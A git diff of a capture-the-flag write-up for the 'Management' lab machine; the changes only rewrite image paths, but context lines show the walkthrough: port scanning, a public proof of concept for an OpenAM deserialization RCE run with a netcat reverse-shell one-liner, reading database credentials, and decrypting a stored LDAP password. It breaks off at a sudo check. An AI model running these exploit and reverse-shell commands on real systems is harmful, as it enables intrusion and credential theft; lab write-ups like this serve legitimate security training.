@@ -23,7 +23,7 @@ Next, I ran an initial Nmap scan to discover open ports and running services:
 nmap -p- -sC -sV --min-rate 10000 -T5 10.129.103.207
 ```
 
-![Nmap scan results](/ctf-writeups/assets/img/management-1.jpg)
+![Nmap scan results](/home/assets/img/management-1.jpg)
 
 The scan revealed several open ports:
 * **Port 22**: SSH (`OpenSSH 9.6p1`)
@@ -33,7 +33,7 @@ The scan revealed several open ports:
 * **Port 4444**: SSL / krb524 (Administration Connector)
 * **Port 50389**: LDAP (Anonymous bind OK)
 
-![Management.htb homepage](/ctf-writeups/assets/img/management-2.png)
+![Management.htb homepage](/home/assets/img/management-2.png)
 
 ---
 
@@ -43,15 +43,15 @@ Directory fuzzing on `https://management.htb/` didn't find any hidden directorie
 
 After Inspecting the source code of the login page revealed the running software version: **OpenAM 16.0.5**.
 
-![OpenAM login page source revealing v=16.0.5](/ctf-writeups/assets/img/management-3.png)
+![OpenAM login page source revealing v=16.0.5](/home/assets/img/management-3.png)
 
 Then I have searched for the vulnerabilities for the OpenAM version 16.0.5 and I found **CVE-2026-33439** which is  pre-authentication Remote Code Execution vulnerability caused by unsafe Java deserialization via the `jato.clientSession` parameter.
 
-![CVE-2026-33439 vulnerability details](/ctf-writeups/assets/img/management-4.png)
+![CVE-2026-33439 vulnerability details](/home/assets/img/management-4.png)
 
 I found a public Python proof-of-concept exploit for this CVE : https://github.com/infernosalex/CVE-2026-33439-Python-PoC .
 
-![CVE-2026-33439 Python PoC repository](/ctf-writeups/assets/img/management-5.png)
+![CVE-2026-33439 Python PoC repository](/home/assets/img/management-5.png)
 
 To exploit it, I started a Netcat listener on my local machine:
 
@@ -65,11 +65,11 @@ Then, I ran the exploit script against the OpenAM password reset endpoint, passi
 python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.171 4444 >/tmp/f'
 ```
 
-![Running the exploit script](/ctf-writeups/assets/img/management-6.png)
+![Running the exploit script](/home/assets/img/management-6.png)
 
 Instantly, my listener caught a connection, giving me a shell as the `openam` user.
 
-![Reverse shell as openam user](/ctf-writeups/assets/img/management-7.jpg)
+![Reverse shell as openam user](/home/assets/img/management-7.jpg)
 
 
 ---
@@ -81,7 +81,7 @@ While exploring the system from the `openam` user context, I located the GLPI co
 * **Database Password**: `8rhu0L6Pw4Y7`
 * **Database Name**: `glpidb`
 
-![Reading config_db.php for database credentials](/ctf-writeups/assets/img/management-8.png)
+![Reading config_db.php for database credentials](/home/assets/img/management-8.png)
 
 ```php
 public $dbhost = '127.0.0.1';
@@ -101,7 +101,7 @@ Among the tables, `glpi_authldaps` looked promising. Querying it revealed an enc
 ```bash
 mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps;"
 ```
-![Querying glpi_authldaps for the encrypted password](/ctf-writeups/assets/img/management-9.jpg)
+![Querying glpi_authldaps for the encrypted password](/home/assets/img/management-9.jpg)
 
 * **Encrypted String**: `avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==`
 
@@ -113,7 +113,7 @@ I wrote a quick one-liner PHP script utilizing GLPI's internal key management to
 php -r ' define("GLPI_CONFIG_DIR", "/opt/glpi/config"); require_once "vendor/autoload.php"; require_once "src/GLPIKey.php"; $key = new GLPIKey(); echo $key->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=="), PHP_EOL; '
 ```
 
-![Decrypting the GLPI password](/ctf-writeups/assets/img/management-10.png)
+![Decrypting the GLPI password](/home/assets/img/management-10.png)
 
 This successfully decrypted the string into the plain-text password: **`WpczC40GhTbk`**.
 
@@ -136,7 +136,7 @@ Checking sudo privileges for user `owen` via `sudo -l` revealed a very interesti
 sudo -l
 ```
 
-![sudo -l output showing rdiff-backup misconfiguration](/ctf-writeups/assets/img/management-11.png) 
+![sudo -l output showing rdiff-backup misconfiguration](/home/assets/img/management-11.png) 
 
 The output showed that `owen` could run `rdiff-backup` as root without a password under strict path and mode restrictions:
 ```text
